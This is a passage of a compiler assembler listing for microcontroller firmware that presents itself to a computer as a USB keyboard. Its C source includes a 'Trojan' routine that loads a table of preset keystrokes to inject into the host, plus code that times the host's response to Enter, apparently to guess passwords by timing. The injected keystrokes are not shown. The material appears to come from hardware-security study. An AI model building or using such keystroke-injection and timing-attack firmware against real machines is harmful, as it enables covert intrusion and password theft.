+ 902              	.LBB4:
+ 258:main.c        **** 
+ 259:main.c        ****     //Iterate in string2sendLut to reset key and Mod
+ 260:main.c        ****     for (int i = 0; i < 40; i++) {
+ 903              		.loc 2 260 14
+ 904 0006 0023     		movs	r3, #0
+ 905 0008 7B60     		str	r3, [r7, #4]
+ 906              		.loc 2 260 5
+ 907 000a 0DE0     		b	.L16
+ 908              	.L17:
+ 261:main.c        ****         string2sendLut[i].Key = 0;
+ 909              		.loc 2 261 31 discriminator 3
+ 910 000c 1F4A     		ldr	r2, .L20
+ 911 000e 7B68     		ldr	r3, [r7, #4]
+ 912 0010 0021     		movs	r1, #0
+ 913 0012 02F81310 		strb	r1, [r2, r3, lsl #1]
+ 262:main.c        ****         string2sendLut[i].Mod = 0;
+ 914              		.loc 2 262 31 discriminator 3
+ 915 0016 1D4A     		ldr	r2, .L20
+ 916 0018 7B68     		ldr	r3, [r7, #4]
+ 917 001a 5B00     		lsls	r3, r3, #1
+ 918 001c 1344     		add	r3, r3, r2
+ 919 001e 0022     		movs	r2, #0
+ 920 0020 5A70     		strb	r2, [r3, #1]
+ 260:main.c        ****         string2sendLut[i].Key = 0;
+ 921              		.loc 2 260 30 discriminator 3
+ 922 0022 7B68     		ldr	r3, [r7, #4]
+ 923 0024 0133     		adds	r3, r3, #1
+ 924 0026 7B60     		str	r3, [r7, #4]
+ 925              	.L16:
+ 260:main.c        ****         string2sendLut[i].Key = 0;
+ 926              		.loc 2 260 5 discriminator 1
+ 927 0028 7B68     		ldr	r3, [r7, #4]
+ 928 002a 272B     		cmp	r3, #39
+ 929 002c EEDD     		ble	.L17
+ 930              	.LBE4:
+ 931              	.LBB5:
+ 263:main.c        ****     }
+ 264:main.c        ****     for (int i = 0; i < 25; i++) {
+ 932              		.loc 2 264 14
+ 933 002e 0023     		movs	r3, #0
+ 934 0030 3B60     		str	r3, [r7]
+ 935              		.loc 2 264 5
+ 936 0032 0DE0     		b	.L18
+ 937              	.L19:
+ 265:main.c        ****         solutionLut[i].Key = 0;
+ 938              		.loc 2 265 28 discriminator 3
+ 939 0034 164A     		ldr	r2, .L20+4
+ 940 0036 3B68     		ldr	r3, [r7]
+ 941 0038 0021     		movs	r1, #0
+ 942 003a 02F81310 		strb	r1, [r2, r3, lsl #1]
+ 266:main.c        ****         solutionLut[i].Mod = 0;
+ 943              		.loc 2 266 28 discriminator 3
+ 944 003e 144A     		ldr	r2, .L20+4
+ 945 0040 3B68     		ldr	r3, [r7]
+ 946 0042 5B00     		lsls	r3, r3, #1
+ 947 0044 1344     		add	r3, r3, r2
+ 948 0046 0022     		movs	r2, #0
+ 949 0048 5A70     		strb	r2, [r3, #1]
+ 264:main.c        ****         solutionLut[i].Key = 0;
+ 950              		.loc 2 264 30 discriminator 3
+ 951 004a 3B68     		ldr	r3, [r7]
+ 952 004c 0133     		adds	r3, r3, #1
+ 953 004e 3B60     		str	r3, [r7]
+ 954              	.L18:
+ 264:main.c        ****         solutionLut[i].Key = 0;
+ 955              		.loc 2 264 5 discriminator 1
+ 956 0050 3B68     		ldr	r3, [r7]
+ 957 0052 182B     		cmp	r3, #24
+ 958 0054 EEDD     		ble	.L19
+ 959              	.LBE5:
+ 267:main.c        ****     }
+ 268:main.c        ****     //reset all variables
+ 269:main.c        ****     string_index = 0;
+ 960              		.loc 2 269 18
+ 961 0056 0F4B     		ldr	r3, .L20+8
+ 962 0058 0022     		movs	r2, #0
+ 963 005a 1A60     		str	r2, [r3]
+ 270:main.c        ****     current_string_length = 1;
+ 964              		.loc 2 270 27
+ 965 005c 0E4B     		ldr	r3, .L20+12
+ 966 005e 0122     		movs	r2, #1
+ 967 0060 1A60     		str	r2, [r3]
+ 271:main.c        ****     characterSent = 0;
+ 968              		.loc 2 271 19
+ 969 0062 0E4B     		ldr	r3, .L20+16
+ 970 0064 0022     		movs	r2, #0
+ 971 0066 1A70     		strb	r2, [r3]
+ 272:main.c        ****     msgiterator = 0;
+ 972              		.loc 2 272 17
+ 973 0068 0D4B     		ldr	r3, .L20+20
+ 974 006a 0022     		movs	r2, #0
+ 975 006c 1A60     		str	r2, [r3]
+ 273:main.c        ****     maxtime = 0;
+ 976              		.loc 2 273 13
+ 977 006e 0D4B     		ldr	r3, .L20+24
+ 978 0070 0022     		movs	r2, #0
+ 979 0072 1A60     		str	r2, [r3]
+ 274:main.c        ****     solution_paste_index = 0;
+ 980              		.loc 2 274 26
+ 981 0074 0C4B     		ldr	r3, .L20+28
+ 982 0076 0022     		movs	r2, #0
+ 983 0078 1A60     		str	r2, [r3]
+ 275:main.c        ****     solutionlen = 0;
+ 984              		.loc 2 275 17
+ 985 007a 0C4B     		ldr	r3, .L20+32
+ 986 007c 0022     		movs	r2, #0
+ 987 007e 1A60     		str	r2, [r3]
+ 276:main.c        **** 
+ 277:main.c        **** }
+ 988              		.loc 2 277 1
+ 989 0080 00BF     		nop
+ 990 0082 0C37     		adds	r7, r7, #12
+ 991              	.LCFI30:
+ 992              		.cfi_def_cfa_offset 4
+ 993 0084 BD46     		mov	sp, r7
+ 994              	.LCFI31:
+ 995              		.cfi_def_cfa_register 13
+ 996              		@ sp needed
+ 997 0086 5DF8047B 		ldr	r7, [sp], #4
+ 998              	.LCFI32:
+ 999              		.cfi_restore 7
+ 1000              		.cfi_def_cfa_offset 0
+ 1001 008a 7047     		bx	lr
+ 1002              	.L21:
+ 1003              		.align	2
+ 1004              	.L20:
+ 1005 008c 00000000 		.word	string2sendLut
+ 1006 0090 00000000 		.word	solutionLut
+ 1007 0094 00000000 		.word	string_index
+ 1008 0098 00000000 		.word	current_string_length
+ 1009 009c 20000000 		.word	characterSent
+ 1010 00a0 00000000 		.word	msgiterator
+ 1011 00a4 00000000 		.word	maxtime
+ 1012 00a8 00000000 		.word	solution_paste_index
+ 1013 00ac 00000000 		.word	solutionlen
+ 1014              		.cfi_endproc
+ 1015              	.LFE206:
+ 1017              		.section	.text.Trojan,"ax",%progbits
+ 1018              		.align	1
+ 1019              		.global	Trojan
+ 1020              		.syntax unified
+ 1021              		.thumb
+ 1022              		.thumb_func
+ 1024              	Trojan:
+ 1025              	.LFB207:
+ 278:main.c        **** 
+ 279:main.c        **** void Trojan(void) {
+ 1026              		.loc 2 279 19
+ 1027              		.cfi_startproc
+ 1028              		@ args = 0, pretend = 0, frame = 0
+ 1029              		@ frame_needed = 1, uses_anonymous_args = 0
+ 1030 0000 80B5     		push	{r7, lr}
+ 1031              	.LCFI33:
+ 1032              		.cfi_def_cfa_offset 8
+ 1033              		.cfi_offset 7, -8
+ 1034              		.cfi_offset 14, -4
+ 1035 0002 00AF     		add	r7, sp, #0
+ 1036              	.LCFI34:
+ 1037              		.cfi_def_cfa_register 7
+ 280:main.c        ****     //delay to stabilise
+ 281:main.c        ****     startTime = 0;
+ 1038              		.loc 2 281 15
+ 1039 0004 0D4B     		ldr	r3, .L25
+ 1040 0006 0022     		movs	r2, #0
+ 1041 0008 1A60     		str	r2, [r3]
+ 282:main.c        ****     while (startTime < 500000){
+ 1042              		.loc 2 282 11
+ 1043 000a 04E0     		b	.L23
+ 1044              	.L24:
+ 283:main.c        **** 
+ 284:main.c        ****          startTime++;
+ 1045              		.loc 2 284 19
+ 1046 000c 0B4B     		ldr	r3, .L25
+ 1047 000e 1B68     		ldr	r3, [r3]
+ 1048 0010 0133     		adds	r3, r3, #1
+ 1049 0012 0A4A     		ldr	r2, .L25
+ 1050 0014 1360     		str	r3, [r2]
+ 1051              	.L23:
+ 282:main.c        ****     while (startTime < 500000){
+ 1052              		.loc 2 282 22
+ 1053 0016 094B     		ldr	r3, .L25
+ 1054 0018 1B68     		ldr	r3, [r3]
+ 282:main.c        ****     while (startTime < 500000){
+ 1055              		.loc 2 282 11
+ 1056 001a 094A     		ldr	r2, .L25+4
+ 1057 001c 9342     		cmp	r3, r2
+ 1058 001e F5DD     		ble	.L24
+ 285:main.c        ****     }
+ 286:main.c        **** 
+ 287:main.c        ****     //ResetBufferLogic();
+ 288:main.c        **** 
+ 289:main.c        ****     memcpy(string2sendLut, trojanInstuctionsLut, trojanLen*sizeof(Keydata));
+ 1059              		.loc 2 289 5
+ 1060 0020 084B     		ldr	r3, .L25+8
+ 1061 0022 1B68     		ldr	r3, [r3]
+ 1062 0024 5B00     		lsls	r3, r3, #1
+ 1063 0026 1A46     		mov	r2, r3
+ 1064 0028 0749     		ldr	r1, .L25+12
+ 1065 002a 0848     		ldr	r0, .L25+16
+ 1066 002c FFF7FEFF 		bl	memcpy
+ 290:main.c        ****     
+ 291:main.c        ****     
+ 292:main.c        ****     string_index = 0;
+ 1067              		.loc 2 292 18
+ 1068 0030 074B     		ldr	r3, .L25+20
+ 1069 0032 0022     		movs	r2, #0
+ 1070 0034 1A60     		str	r2, [r3]
+ 293:main.c        **** 
+ 294:main.c        **** }
+ 1071              		.loc 2 294 1
+ 1072 0036 00BF     		nop
+ 1073 0038 80BD     		pop	{r7, pc}
+ 1074              	.L26:
+ 1075 003a 00BF     		.align	2
+ 1076              	.L25:
+ 1077 003c 00000000 		.word	startTime
+ 1078 0040 1FA10700 		.word	499999
+ 1079 0044 00000000 		.word	trojanLen
+ 1080 0048 00000000 		.word	trojanInstuctionsLut
+ 1081 004c 00000000 		.word	string2sendLut
+ 1082 0050 00000000 		.word	string_index
+ 1083              		.cfi_endproc
+ 1084              	.LFE207:
+ 1086              		.global	clock_config
+ 1087              		.section	.rodata
+ 1088              		.align	2
+ 1091              	clock_config:
+ 1092 0000 50       		.byte	80
+ 1093 0001 02       		.byte	2
+ 1094 0002 04       		.byte	4
+ 1095 0003 01       		.byte	1
+ 1096 0004 0000     		.short	0
+ 1097 0006 01       		.byte	1
+ 1098 0007 00       		.space	1
+ 1099 0008 00       		.byte	0
+ 1100 0009 000000   		.space	3
+ 1101 000c 00000100 		.word	65536
+ 1102 0010 01       		.byte	1
+ 1103 0011 01       		.byte	1
+ 1104 0012 01       		.byte	1
+ 1105 0013 01       		.byte	1
+ 1106              		.section	.text.main,"ax",%progbits
+ 1107              		.align	1
+ 1108              		.global	main
+ 1109              		.syntax unified
+ 1110              		.thumb
+ 1111              		.thumb_func
+ 1113              	main:
+ 1114              	.LFB208:
+ 295:main.c        **** 
+ 296:main.c        **** 
+ 297:main.c        **** 
+ 298:main.c        **** 
+ 299:main.c        **** /* Clock configuration */
+ 300:main.c        **** XMC_SCU_CLOCK_CONFIG_t clock_config = {
+ 301:main.c        **** 	.syspll_config.p_div  = 2,
+ 302:main.c        **** 	.syspll_config.n_div  = 80,
+ 303:main.c        **** 	.syspll_config.k_div  = 4,
+ 304:main.c        **** 	.syspll_config.mode   = XMC_SCU_CLOCK_SYSPLL_MODE_NORMAL,
+ 305:main.c        **** 	.syspll_config.clksrc = XMC_SCU_CLOCK_SYSPLLCLKSRC_OSCHP,
+ 306:main.c        **** 	.enable_oschp         = true,
+ 307:main.c        **** 	.calibration_mode     = XMC_SCU_CLOCK_FOFI_CALIBRATION_MODE_FACTORY,
+ 308:main.c        **** 	.fsys_clksrc          = XMC_SCU_CLOCK_SYSCLKSRC_PLL,
+ 309:main.c        **** 	.fsys_clkdiv          = 1,
+ 310:main.c        **** 	.fcpu_clkdiv          = 1,
+ 311:main.c        **** 	.fccu_clkdiv          = 1,
+ 312:main.c        **** 	.fperipheral_clkdiv   = 1
+ 313:main.c        **** };
+ 314:main.c        **** 
+ 315:main.c        **** /* Forward declaration of HID callbacks as defined by LUFA */
+ 316:main.c        **** bool CALLBACK_HID_Device_CreateHIDReport(
+ 317:main.c        **** 							USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
+ 318:main.c        **** 							uint8_t* const ReportID,
+ 319:main.c        **** 							const uint8_t ReportType,
+ 320:main.c        **** 							void* ReportData,
+ 321:main.c        **** 							uint16_t* const ReportSize );
+ 322:main.c        **** 
+ 323:main.c        **** void CALLBACK_HID_Device_ProcessHIDReport(
+ 324:main.c        **** 							USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
+ 325:main.c        **** 							const uint8_t ReportID,
+ 326:main.c        **** 							const uint8_t ReportType,
+ 327:main.c        **** 							const void* ReportData,
+ 328:main.c        **** 							const uint16_t ReportSize );
+ 329:main.c        **** 
+ 330:main.c        **** void SystemCoreClockSetup(void);
+ 331:main.c        **** 
+ 332:main.c        **** /**
+ 333:main.c        ****  * Main program entry point. This routine configures the hardware required by
+ 334:main.c        ****  * the application, then enters a loop to run the application tasks in sequence.
+ 335:main.c        ****  */
+ 336:main.c        **** int main(void) {
+ 1115              		.loc 2 336 16
+ 1116              		.cfi_startproc
+ 1117              		@ args = 0, pretend = 0, frame = 8
+ 1118              		@ frame_needed = 1, uses_anonymous_args = 0
+ 1119 0000 80B5     		push	{r7, lr}
+ 1120              	.LCFI35:
+ 1121              		.cfi_def_cfa_offset 8
+ 1122              		.cfi_offset 7, -8
+ 1123              		.cfi_offset 14, -4
+ 1124 0002 82B0     		sub	sp, sp, #8
+ 1125              	.LCFI36:
+ 1126              		.cfi_def_cfa_offset 16
+ 1127 0004 00AF     		add	r7, sp, #0
+ 1128              	.LCFI37:
+ 1129              		.cfi_def_cfa_register 7
+ 337:main.c        **** 	// Init LED pins for debugging and NUM/CAPS visual report
+ 338:main.c        **** 	XMC_GPIO_SetMode(LED1,XMC_GPIO_MODE_OUTPUT_PUSH_PULL);
+ 1130              		.loc 2 338 2
+ 1131 0006 8022     		movs	r2, #128
+ 1132 0008 0121     		movs	r1, #1
+ 1133 000a 1448     		ldr	r0, .L31
+ 1134 000c FFF7FEFF 		bl	XMC_GPIO_SetMode
+ 339:main.c        **** 	XMC_GPIO_SetMode(LED2,XMC_GPIO_MODE_OUTPUT_PUSH_PULL);
+ 1135              		.loc 2 339 2
+ 1136 0010 8022     		movs	r2, #128
+ 1137 0012 0021     		movs	r1, #0
+ 1138 0014 1148     		ldr	r0, .L31
+ 1139 0016 FFF7FEFF 		bl	XMC_GPIO_SetMode
+ 340:main.c        **** 	USB_Init();
+ 1140              		.loc 2 340 2
+ 1141 001a FFF7FEFF 		bl	USB_Init
+ 341:main.c        **** 	SystemCoreClockSetup();   
+ 1142              		.loc 2 341 2
+ 1143 001e FFF7FEFF 		bl	SystemCoreClockSetup
+ 342:main.c        ****     //use DWT for more precise timing than SysTick (Stocazzo conta meglio il mio casio da 10 euro)
+ 343:main.c        ****     CoreDebug -> DEMCR |= CoreDebug_DEMCR_TRCENA_Msk; // Enable DWT
+ 1144              		.loc 2 343 24
+ 1145 0022 0F4B     		ldr	r3, .L31+4
+ 1146 0024 DB68     		ldr	r3, [r3, #12]
+ 1147 0026 0E4A     		ldr	r2, .L31+4
+ 1148 0028 43F08073 		orr	r3, r3, #16777216
+ 1149 002c D360     		str	r3, [r2, #12]
+ 344:main.c        ****     DWT -> CYCCNT = 0; // Reset the counter
+ 1150              		.loc 2 344 9
+ 1151 002e 0D4B     		ldr	r3, .L31+8
+ 1152              		.loc 2 344 19
+ 1153 0030 0022     		movs	r2, #0
+ 1154 0032 5A60     		str	r2, [r3, #4]
+ 345:main.c        ****     DWT -> CTRL |= DWT_CTRL_CYCCNTENA_Msk; // Enable the cycle counter 
+ 1155              		.loc 2 345 17
+ 1156 0034 0B4B     		ldr	r3, .L31+8
+ 1157 0036 1B68     		ldr	r3, [r3]
+ 1158 0038 0A4A     		ldr	r2, .L31+8
+ 1159 003a 43F00103 		orr	r3, r3, #1
+ 1160 003e 1360     		str	r3, [r2]
+ 1161              	.LBB6:
+ 346:main.c        ****     //SysTick_Config(SystemCoreClock / 1000000);
+ 347:main.c        ****     //ResetBufferLogic();
+ 348:main.c        **** 	// Wait until host has enumerated HID device
+ 349:main.c        **** 	for(int i = 0; i < 10e6; ++i)
+ 1162              		.loc 2 349 10
+ 1163 0040 0023     		movs	r3, #0
+ 1164 0042 7B60     		str	r3, [r7, #4]
+ 1165              		.loc 2 349 2
+ 1166 0044 02E0     		b	.L28
+ 1167              	.L29:
+ 1168              		.loc 2 349 27 discriminator 3
+ 1169 0046 7B68     		ldr	r3, [r7, #4]
+ 1170 0048 0133     		adds	r3, r3, #1
+ 1171 004a 7B60     		str	r3, [r7, #4]
+ 1172              	.L28:
+ 1173              		.loc 2 349 2 discriminator 1
+ 1174 004c 7B68     		ldr	r3, [r7, #4]
+ 1175 004e 064A     		ldr	r2, .L31+12
+ 1176 0050 9342     		cmp	r3, r2
+ 1177 0052 F8DB     		blt	.L29
+ 1178              	.L30:
+ 1179              	.LBE6:
+ 350:main.c        **** 		; 
+ 351:main.c        **** 
+ 352:main.c        **** 	while (1) {
+ 353:main.c        **** 		HID_Device_USBTask(&Keyboard_HID_Interface);
+ 1180              		.loc 2 353 3 discriminator 1
+ 1181 0054 0548     		ldr	r0, .L31+16
+ 1182 0056 FFF7FEFF 		bl	HID_Device_USBTask
+ 1183 005a FBE7     		b	.L30
+ 1184              	.L32:
+ 1185              		.align	2
+ 1186              	.L31:
+ 1187 005c 00810248 		.word	1208123648
+ 1188 0060 F0ED00E0 		.word	-536810000
+ 1189 0064 001000E0 		.word	-536866816
+ 1190 0068 80969800 		.word	10000000
+ 1191 006c 00000000 		.word	Keyboard_HID_Interface
+ 1192              		.cfi_endproc
+ 1193              	.LFE208:
+ 1195              		.section	.text.CALLBACK_HID_Device_CreateHIDReport,"ax",%progbits
+ 1196              		.align	1
+ 1197              		.global	CALLBACK_HID_Device_CreateHIDReport
+ 1198              		.syntax unified
+ 1199              		.thumb
+ 1200              		.thumb_func
+ 1202              	CALLBACK_HID_Device_CreateHIDReport:
+ 1203              	.LFB209:
+ 354:main.c        **** 	}
+ 355:main.c        **** }
+ 356:main.c        **** 
+ 357:main.c        **** // Callback function called when a new HID report needs to be created
+ 358:main.c        **** bool CALLBACK_HID_Device_CreateHIDReport(
+ 359:main.c        **** 							USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
+ 360:main.c        **** 							uint8_t* const ReportID,
+ 361:main.c        **** 							const uint8_t ReportType,
+ 362:main.c        **** 							void* ReportData,
+ 363:main.c        **** 							uint16_t* const ReportSize ) {
+ 1204              		.loc 2 363 37
+ 1205              		.cfi_startproc
+ 1206              		@ args = 4, pretend = 0, frame = 24
+ 1207              		@ frame_needed = 1, uses_anonymous_args = 0
+ 1208              		@ link register save eliminated.
+ 1209 0000 80B4     		push	{r7}
+ 1210              	.LCFI38:
+ 1211              		.cfi_def_cfa_offset 4
+ 1212              		.cfi_offset 7, -4
+ 1213 0002 87B0     		sub	sp, sp, #28
+ 1214              	.LCFI39:
+ 1215              		.cfi_def_cfa_offset 32
+ 1216 0004 00AF     		add	r7, sp, #0
+ 1217              	.LCFI40:
+ 1218              		.cfi_def_cfa_register 7
+ 1219 0006 F860     		str	r0, [r7, #12]
+ 1220 0008 B960     		str	r1, [r7, #8]
+ 1221 000a 3B60     		str	r3, [r7]
+ 1222 000c 1346     		mov	r3, r2
+ 1223 000e FB71     		strb	r3, [r7, #7]
+ 364:main.c        **** 	USB_KeyboardReport_Data_t* report = (USB_KeyboardReport_Data_t *)ReportData;
+ 1224              		.loc 2 364 29
+ 1225 0010 3B68     		ldr	r3, [r7]
+ 1226 0012 7B61     		str	r3, [r7, #20]
+ 365:main.c        **** 	*ReportSize = sizeof(USB_KeyboardReport_Data_t);
+ 1227              		.loc 2 365 14
+ 1228 0014 3B6A     		ldr	r3, [r7, #32]
+ 1229 0016 0822     		movs	r2, #8
+ 1230 0018 1A80     		strh	r2, [r3]	@ movhi
+ 366:main.c        **** 
+ 367:main.c        **** int total_reports = (current_string_length + 1) * 2; // 2 iterations 0 and 1 for each character
+ 1231              		.loc 2 367 44
+ 1232 001a 7D4B     		ldr	r3, .L57
+ 1233 001c 1B68     		ldr	r3, [r3]
+ 1234 001e 0133     		adds	r3, r3, #1
+ 1235              		.loc 2 367 5
+ 1236 0020 5B00     		lsls	r3, r3, #1
+ 1237 0022 3B61     		str	r3, [r7, #16]
+ 368:main.c        **** 
+ 369:main.c        **** 
+ 370:main.c        **** 
+ 371:main.c        **** if (((string_index < total_reports) && (password_enable == 1)) || ((string_index < (trojanLen+1)) &
+ 1238              		.loc 2 371 20
+ 1239 0024 7B4B     		ldr	r3, .L57+4
+ 1240 0026 1B68     		ldr	r3, [r3]
+ 1241              		.loc 2 371 4
+ 1242 0028 3A69     		ldr	r2, [r7, #16]
+ 1243 002a 9A42     		cmp	r2, r3
+ 1244 002c 03DD     		ble	.L34
+ 1245              		.loc 2 371 57 discriminator 1
+ 1246 002e 7A4B     		ldr	r3, .L57+8
+ 1247 0030 1B68     		ldr	r3, [r3]
+ 1248              		.loc 2 371 37 discriminator 1
+ 1249 0032 012B     		cmp	r3, #1
+ 1250 0034 0BD0     		beq	.L35
+ 1251              	.L34:
+ 1252              		.loc 2 371 82 discriminator 3
+ 1253 0036 794B     		ldr	r3, .L57+12
+ 1254 0038 1A68     		ldr	r2, [r3]
+ 1255 003a 764B     		ldr	r3, .L57+4
+ 1256 003c 1B68     		ldr	r3, [r3]
+ 1257              		.loc 2 371 64 discriminator 3
+ 1258 003e 9A42     		cmp	r2, r3
+ 1259 0040 C0F2DD80 		blt	.L56
+ 1260              		.loc 2 371 119 discriminator 4
+ 1261 0044 744B     		ldr	r3, .L57+8
+ 1262 0046 1B68     		ldr	r3, [r3]
+ 1263              		.loc 2 371 99 discriminator 4
+ 1264 0048 002B     		cmp	r3, #0
+ 1265 004a 40F0D880 		bne	.L56
+ 1266              	.L35:
+ 372:main.c        ****     switch(string2sendLut[string_index].Mod) {
+ 1267              		.loc 2 372 40
+ 1268 004e 714B     		ldr	r3, .L57+4
+ 1269 0050 1B68     		ldr	r3, [r3]
+ 1270 0052 734A     		ldr	r2, .L57+16
+ 1271 0054 5B00     		lsls	r3, r3, #1
+ 1272 0056 1344     		add	r3, r3, r2
+ 1273 0058 5B78     		ldrb	r3, [r3, #1]	@ zero_extendqisi2
+ 1274              		.loc 2 372 5
+ 1275 005a 022B     		cmp	r3, #2
+ 1276 005c 6BD0     		beq	.L37
+ 1277 005e 022B     		cmp	r3, #2
+ 1278 0060 00F39D80 		bgt	.L38
+ 1279 0064 002B     		cmp	r3, #0
+ 1280 0066 02D0     		beq	.L39
+ 1281 0068 012B     		cmp	r3, #1
+ 1282 006a 30D0     		beq	.L40
+ 1283 006c 97E0     		b	.L38
+ 1284              	.L39:
+ 373:main.c        ****         case 0:
+ 374:main.c        ****             if(characterSent) {
+ 1285              		.loc 2 374 16
+ 1286 006e 6D4B     		ldr	r3, .L57+20
+ 1287 0070 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 1288              		.loc 2 374 15
+ 1289 0072 002B     		cmp	r3, #0
+ 1290 0074 0ED0     		beq	.L41
+ 375:main.c        **** 			    report->Reserved = 0; 
+ 1291              		.loc 2 375 25
+ 1292 0076 7B69     		ldr	r3, [r7, #20]
+ 1293 0078 0022     		movs	r2, #0
+ 1294 007a 5A70     		strb	r2, [r3, #1]
+ 376:main.c        **** 			    report->KeyCode[0] = 0; 
+ 1295              		.loc 2 376 27
+ 1296 007c 7B69     		ldr	r3, [r7, #20]
+ 1297 007e 0022     		movs	r2, #0
+ 1298 0080 9A70     		strb	r2, [r3, #2]
+ 377:main.c        **** 			    characterSent = 0;
+ 1299              		.loc 2 377 22
+ 1300 0082 684B     		ldr	r3, .L57+20
+ 1301 0084 0022     		movs	r2, #0
+ 1302 0086 1A70     		strb	r2, [r3]
+ 378:main.c        **** 			    string_index++; 
+ 1303              		.loc 2 378 20
+ 1304 0088 624B     		ldr	r3, .L57+4
+ 1305 008a 1B68     		ldr	r3, [r3]
+ 1306 008c 0133     		adds	r3, r3, #1
+ 1307 008e 614A     		ldr	r2, .L57+4
+ 1308 0090 1360     		str	r3, [r2]
+ 379:main.c        ****             }else {
+ 380:main.c        **** 			    report->Modifier = 0; 
+ 381:main.c        **** 			    report->Reserved = 0; 
+ 382:main.c        **** 			    report->KeyCode[0] = string2sendLut[string_index].Key;
+ 383:main.c        ****                 if (string2sendLut[string_index].Key == GERMAN_KEYBOARD_SC_ENTER) { 
+ 384:main.c        ****                     //startTime = GetTick(); // Start timing when we are at the final report stage
+ 385:main.c        ****                     startTime = DWT -> CYCCNT;
+ 386:main.c        ****                 }
+ 387:main.c        **** 			characterSent = 1;
+ 388:main.c        **** 		    }
+ 389:main.c        **** 		
+ 390:main.c        ****             break;
+ 1309              		.loc 2 390 13
+ 1310 0092 B5E0     		b	.L36
+ 1311              	.L41:
+ 380:main.c        **** 			    report->Reserved = 0; 
+ 1312              		.loc 2 380 25
+ 1313 0094 7B69     		ldr	r3, [r7, #20]
+ 1314 0096 0022     		movs	r2, #0
+ 1315 0098 1A70     		strb	r2, [r3]
+ 381:main.c        **** 			    report->KeyCode[0] = string2sendLut[string_index].Key;
+ 1316              		.loc 2 381 25
+ 1317 009a 7B69     		ldr	r3, [r7, #20]
+ 1318 009c 0022     		movs	r2, #0
+ 1319 009e 5A70     		strb	r2, [r3, #1]
+ 382:main.c        ****                 if (string2sendLut[string_index].Key == GERMAN_KEYBOARD_SC_ENTER) { 
+ 1320              		.loc 2 382 57
+ 1321 00a0 5C4B     		ldr	r3, .L57+4
+ 1322 00a2 1B68     		ldr	r3, [r3]
+ 1323 00a4 5E4A     		ldr	r2, .L57+16
+ 1324 00a6 12F81320 		ldrb	r2, [r2, r3, lsl #1]	@ zero_extendqisi2
+ 382:main.c        ****                 if (string2sendLut[string_index].Key == GERMAN_KEYBOARD_SC_ENTER) { 
+ 1325              		.loc 2 382 27
+ 1326 00aa 7B69     		ldr	r3, [r7, #20]
+ 1327 00ac 9A70     		strb	r2, [r3, #2]
+ 383:main.c        ****                     //startTime = GetTick(); // Start timing when we are at the final report stage
+ 1328              		.loc 2 383 49
+ 1329 00ae 594B     		ldr	r3, .L57+4
+ 1330 00b0 1B68     		ldr	r3, [r3]
+ 1331 00b2 5B4A     		ldr	r2, .L57+16
+ 1332 00b4 12F81330 		ldrb	r3, [r2, r3, lsl #1]	@ zero_extendqisi2
+ 383:main.c        ****                     //startTime = GetTick(); // Start timing when we are at the final report stage
+ 1333              		.loc 2 383 20
+ 1334 00b8 282B     		cmp	r3, #40
+ 1335 00ba 04D1     		bne	.L43
+ 385:main.c        ****                 }
+ 1336              		.loc 2 385 37
+ 1337 00bc 5A4B     		ldr	r3, .L57+24
+ 1338 00be 5B68     		ldr	r3, [r3, #4]
+ 1339 00c0 1A46     		mov	r2, r3
+ 385:main.c        ****                 }
+ 1340              		.loc 2 385 31
+ 1341 00c2 5A4B     		ldr	r3, .L57+28
+ 1342 00c4 1A60     		str	r2, [r3]
+ 1343              	.L43:
+ 387:main.c        **** 		    }
+ 1344              		.loc 2 387 18
+ 1345 00c6 574B     		ldr	r3, .L57+20
+ 1346 00c8 0122     		movs	r2, #1
+ 1347 00ca 1A70     		strb	r2, [r3]
+ 1348              		.loc 2 390 13
+ 1349 00cc 98E0     		b	.L36
+ 1350              	.L40:
+ 391:main.c        **** 
+ 392:main.c        ****         case 1: //shift
+ 393:main.c        ****             if(characterSent) {
+ 1351              		.loc 2 393 16
+ 1352 00ce 554B     		ldr	r3, .L57+20
+ 1353 00d0 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 1354              		.loc 2 393 15
+ 1355 00d2 002B     		cmp	r3, #0
+ 1356 00d4 0ED0     		beq	.L44
+ 394:main.c        **** 			    report->Reserved = 0; 
+ 1357              		.loc 2 394 25
+ 1358 00d6 7B69     		ldr	r3, [r7, #20]
+ 1359 00d8 0022     		movs	r2, #0
+ 1360 00da 5A70     		strb	r2, [r3, #1]
+ 395:main.c        **** 			    report->KeyCode[0] = 0; 
+ 1361              		.loc 2 395 27
+ 1362 00dc 7B69     		ldr	r3, [r7, #20]
+ 1363 00de 0022     		movs	r2, #0
+ 1364 00e0 9A70     		strb	r2, [r3, #2]
+ 396:main.c        **** 			    characterSent = 0;
+ 1365              		.loc 2 396 22
+ 1366 00e2 504B     		ldr	r3, .L57+20
+ 1367 00e4 0022     		movs	r2, #0
+ 1368 00e6 1A70     		strb	r2, [r3]
+ 397:main.c        **** 			    string_index++; 
+ 1369              		.loc 2 397 20
+ 1370 00e8 4A4B     		ldr	r3, .L57+4
+ 1371 00ea 1B68     		ldr	r3, [r3]
+ 1372 00ec 0133     		adds	r3, r3, #1
+ 1373 00ee 494A     		ldr	r2, .L57+4
+ 1374 00f0 1360     		str	r3, [r2]
+ 398:main.c        ****             }else{
+ 399:main.c        **** 			    report->Reserved = 0; 
+ 400:main.c        **** 			    report->KeyCode[0] = string2sendLut[string_index].Key;
+ 401:main.c        ****             
+ 402:main.c        ****                 if (string2sendLut[string_index].Key == GERMAN_KEYBOARD_SC_ENTER) { 
+ 403:main.c        ****                     //startTime = GetTick(); // Start timing when we are at the final report stage
+ 404:main.c        ****                     startTime = DWT -> CYCCNT;
+ 405:main.c        ****                     report -> Modifier = 0;
+ 406:main.c        ****                 }else{
+ 407:main.c        ****                     report->Modifier = 0x02; 
+ 408:main.c        ****                 }
+ 409:main.c        **** 
+ 410:main.c        **** 			characterSent = 1;
+ 411:main.c        ****             }
+ 412:main.c        **** 
+ 413:main.c        ****             break;
+ 1375              		.loc 2 413 13
+ 1376 00f2 85E0     		b	.L36
+ 1377              	.L44:
+ 399:main.c        **** 			    report->KeyCode[0] = string2sendLut[string_index].Key;
+ 1378              		.loc 2 399 25
+ 1379 00f4 7B69     		ldr	r3, [r7, #20]
+ 1380 00f6 0022     		movs	r2, #0
+ 1381 00f8 5A70     		strb	r2, [r3, #1]
+ 400:main.c        ****             
+ 1382              		.loc 2 400 57
+ 1383 00fa 464B     		ldr	r3, .L57+4
+ 1384 00fc 1B68     		ldr	r3, [r3]
